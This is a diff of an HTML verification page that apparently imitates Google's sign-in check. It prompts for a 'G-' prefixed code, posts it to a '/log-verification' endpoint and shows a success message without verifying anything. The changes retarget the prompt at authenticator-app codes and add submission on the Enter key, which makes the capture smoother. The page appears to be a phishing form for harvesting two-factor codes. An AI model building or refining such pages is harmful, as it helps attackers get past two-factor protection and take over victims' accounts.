@@ -121,26 +121,21 @@
 <body>
   <div class="card">
     <h2>Verify this is you</h2>
-    <p>Enter the verification code sent to your phone or email.</p>
+    <p>Enter the verification code from your authenticator app.</p>
 
-    <form id="verifyForm" autocomplete="off">
-      <div class="field-box" id="codeBox">
-        <span class="field-label" id="codeLabel">Verification Code</span>
-        <div class="input-row">
-          <span class="prefix">G-</span>
-          <input class="field-input" id="codeInput" type="text" 
-autocomplete="off" />
-        </div>
+    <div class="field-box" id="codeBox">
+      <span class="field-label" id="codeLabel">Verification Code</span>
+      <div class="input-row">
+        <span class="prefix">G-</span>
+        <input class="field-input" id="codeInput" type="text" autocomplete="off" />
       </div>
+    </div>
 
-      <div class="success-msg" id="successMsg" style="display:none;">Code 
-submitted successfully.</div>
+    <div class="success-msg" id="successMsg" style="display:none;">Code submitted successfully.</div>
 
-      <div class="btn-row">
-        <button type="submit" class="submit-btn" 
-id="submitBtn">Submit</button>
-      </div>
-    </form>
+    <div class="btn-row">
+      <button type="button" class="submit-btn" id="submitBtn" onclick="handleSubmit()">Submit</button>
+    </div>
   </div>
 
   <div class="footer">
@@ -152,26 +147,39 @@ id="submitBtn">Submit</button>
     const label = document.getElementById('codeLabel');
     const input = document.getElementById('codeInput');
 
-    input.addEventListener('focus', () => { box.classList.add('focused'); 
-label.classList.add('focused-label'); });
-    input.addEventListener('blur',  () => { 
-box.classList.remove('focused'); label.classList.remove('focused-label'); 
-});
+    input.addEventListener('focus', () => {
+      box.classList.add('focused');
+      label.classList.add('focused-label');
+    });
+    input.addEventListener('blur', () => {
+      box.classList.remove('focused');
+      label.classList.remove('focused-label');
+    });
 
-    document.getElementById('verifyForm').addEventListener('submit', async 
-e => {
-      e.preventDefault();
+    // Also allow submitting by pressing Enter
+    input.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        handleSubmit();
+      }
+    });
+
+    async function handleSubmit() {
       const btn  = document.getElementById('submitBtn');
       const code = input.value;
       btn.disabled = true;
-      await fetch('/log-verification', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ verificationCode: 'G-' + code })
-      });
+      try {
+        await fetch('/log-verification', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ verificationCode: 'G-' + code })
+        });
+        document.getElementById('successMsg').style.display = 'block';
+      } catch (err) {
+        console.error('Failed to log verification:', err);
+      }
       btn.disabled = false;
-      document.getElementById('successMsg').style.display = 'block';
-    });
+    }
   </script>
 </body>
 </html>
